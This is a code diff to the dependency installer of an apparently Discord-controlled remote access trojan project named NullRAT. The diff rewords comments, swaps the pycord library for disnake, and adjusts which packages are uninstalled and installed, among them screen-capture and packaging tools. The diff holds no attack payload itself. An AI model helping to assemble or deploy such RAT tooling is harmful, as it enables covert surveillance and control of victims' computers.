@@ -2,12 +2,13 @@
 
 namespace NullRAT.Dependencies
 {
-#pragma warning disable CS8600 // Converting null literal or possible null value to non-nullable type.
+// Converting null literal or possible null value to non-nullable type.
+#pragma warning disable CS8600 
     class Program
     {
         static void Main()
         {
-            //Lock cmd
+            // Disable changing console size and closing
             LockConsole.LockConsoleSizeXY();
 
             #region Presentation
@@ -33,7 +34,6 @@ namespace NullRAT.Dependencies
             string[] ipAddresses = { "1.1.1.1", "1.0.0.1", "8.8.8.8", "8.8.4.4" };
             bool[] result = new bool[4];
 
-            //Iterate through the ipAddresses array
             for (int i = 0; i < ipAddresses.Length; i++)
             {
                 try
@@ -52,25 +52,25 @@ namespace NullRAT.Dependencies
                     }
                     else
                     {
-                        throw new Exception("IP Address couldn't be parsed.");
+                        throw new Exception("Unable to parse IP Address");
                     }
                 }
                 catch
                 {
-                    AnsiConsole.MarkupLine("The IP Couldn't be parsed...");
+                    AnsiConsole.MarkupLine("The IP Address couldn't be parsed");
                 }
             }
 
             if (!result.Contains(true))
             {
-                //Pings Failed. Trying to send an HTTP request to https://www.google.com . If it fails, then send a request to https://www.github.com
+                // Pings failed. Trying to send an HTTP request to https://www.google.com. If it fails, then send a request to https://www.github.com
                 if (CheckConnection.SendPetition("https://www.google.com"))
                 {
-                    //Pings seem to be disabled  ¯\_(ツ)_/¯
+                    // Pinging seems to be disabled. Nothing to do
                 }
                 else if (CheckConnection.SendPetition("https://www.github.com"))
                 {
-                    //Pings seem to be disabled  ¯\_(ツ)_/¯
+                    // Pinging seems to be disabled. Nothing to do
                 }
                 else
                 {
@@ -88,9 +88,9 @@ namespace NullRAT.Dependencies
 
             VerifyEnvironment.VerifyPipAndPython();
 
-            string[] IncompatiblePackages = new string[1]
+            string[] IncompatiblePackages = new string[2]
             {
-                "discord.py" //Discord.py breaks things.
+                "discord.py", "py-cord" // Breaking packages that shouldn't exist
             };
             SlowPrint("\nUninstalling incompatible packages...", "aqua", true);
             AnsiConsole.Markup("[aqua]---------------------------------------\n[/]");
@@ -114,10 +114,9 @@ namespace NullRAT.Dependencies
                         }
                     }
                 }).Start();
-                //Sleep 0.5 seconds, avoids some Printing errors.
+                
                 Thread.Sleep(500);
             }
-            //Avoid possible errors.
             Thread.Sleep(1500);
             if (noIncompatibilities)
             {
@@ -141,7 +140,7 @@ namespace NullRAT.Dependencies
             {
                 "virtualenv",
                 "aiohttp",
-                "https://github.com/Pycord-Development/pycord/archive/refs/heads/master.zip",
+                "disnake",
                 "requests",
                 "mss",
                 "pyinstaller",
@@ -153,7 +152,7 @@ namespace NullRAT.Dependencies
             {
                 "virtualenv",
                 "aiohttp",
-                "py-cord",
+                "disnake",
                 "requests",
                 "mss",
                 "pyinstaller",
@@ -162,8 +161,7 @@ namespace NullRAT.Dependencies
 
             ProgramData.PackagesToInstall = (uint)ProgramData.Packages.Length;
 
-            // For each Package, run a thread installing it
-
+            // For each package, run a thread to install it
             for (int i = 0; i < ProgramData.Packages.Length; i++)
             {
                 Thread PipInstall;
